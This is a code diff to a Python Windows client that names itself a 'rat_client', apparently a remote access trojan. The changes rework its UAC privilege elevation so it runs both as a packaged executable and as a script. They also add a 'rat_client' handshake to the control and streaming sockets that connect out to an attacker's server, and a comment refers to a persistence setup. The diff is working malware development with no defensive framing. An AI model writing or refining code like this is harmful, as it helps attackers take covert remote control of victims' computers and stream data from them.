@@ -211,9 +211,12 @@ def attempt_elevation():
     sei.fMask = SEE_MASK_NOCLOSEPROCESS
     sei.hwnd = None
     sei.lpVerb = "runas"
-    sei.lpFile = sys.executable
-    # Pass a dedicated argument to the new elevated process to avoid conflicting with persistence setup.
-    sei.lpParameters = "--elevated"
+    if getattr(sys, 'frozen', False):
+        sei.lpFile = sys.executable
+        sei.lpParameters = "--elevated"
+    else:
+        sei.lpFile = sys.executable
+        sei.lpParameters = f'"{os.path.abspath(sys.argv[0])}" --elevated'
     sei.lpDirectory = None
     sei.nShow = SW_SHOW
 
@@ -386,6 +389,7 @@ class ControlHandler(threading.Thread):
         control_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
         try:
             control_socket.connect((self.server_ip, self.port))
+            control_socket.sendall(b'rat_client') # Handshake for server bridge
             # Use a file-like object for easier reading of line-based JSON
             f = control_socket.makefile('r')
             while not self.stop_event.is_set():
@@ -448,6 +452,7 @@ class Streamer(threading.Thread):
             data_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
             try:
                 data_socket.connect((self.server_ip, self.port))
+                data_socket.sendall(b'rat_client') # Handshake for server bridge
             except Exception:
                 # Server might have closed the listener before we could connect
                 return
